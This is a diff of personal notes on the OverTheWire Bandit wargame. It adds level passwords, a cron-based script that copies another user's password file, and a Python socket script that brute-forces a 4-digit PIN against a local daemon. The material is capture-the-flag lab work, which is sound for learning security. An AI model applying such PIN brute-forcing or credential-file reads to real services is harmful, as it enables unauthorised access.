@@ -100,8 +100,10 @@ level 24: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
       Shell script:
       #!/bin/bash
       cat /usr/bandit_pass/bandit24 >> /tmp/j-bandit/j-bandit-pass
-level 25: 
+level 25: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
       shell script (BRUTE-FORCE CRACK):
+      /* DIDN'T WORK */
       #!/bin/bash
       pass24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
       pin=0
@@ -115,3 +117,20 @@ level 25:
       ((pin++))
       done
       
+      /* WORKED */
+      import socket
+      pin = 0
+      bandit = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
+      client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      client.connect(('localhost', 30002))
+      client.recv(1024)
+      while pin in range(0, 10000):
+          message = bandit + ' ' + ' ' + str(pin) + '\n'
+	  print 'Trying: ' + message
+          client.sendall(message)
+	  data = client.recv(1024)
+	  print data
+	  pin += 1
+      
+      >> python brute.py
+level26:
